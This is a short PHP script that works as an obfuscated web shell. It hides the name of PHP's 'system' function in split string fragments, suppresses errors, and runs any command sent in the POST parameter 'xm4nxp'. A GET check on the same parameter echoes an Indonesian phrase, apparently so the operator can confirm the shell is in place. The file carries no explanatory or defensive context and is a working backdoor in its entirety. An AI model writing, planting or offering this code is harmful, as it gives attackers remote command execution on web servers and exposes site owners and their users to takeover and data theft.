<?php
error_reporting(0);

$abc = [
    ["sy", "stem"],
    ["sh", "ell"],
    ["ex", "ec"]
];

function obfuscate($xyz, $index, $cmd) {
    $fn = implode('', $xyz[$index]);
    if (function_exists($fn)) {
        $fn($cmd);
    } else {
        echo "Function $fn does not exist.";
    }
}
if (isset($_POST['xm4nxp'])) {
    $cmd = $_POST['xm4nxp'];
    obfuscate($abc, 0, $cmd);
}
if (isset($_GET['xm4nxp'])) {
    $param = $_GET['xm4nxp'];
    if ($param === 'index') {
        echo "aku sayang kamu";
    }
}
?>
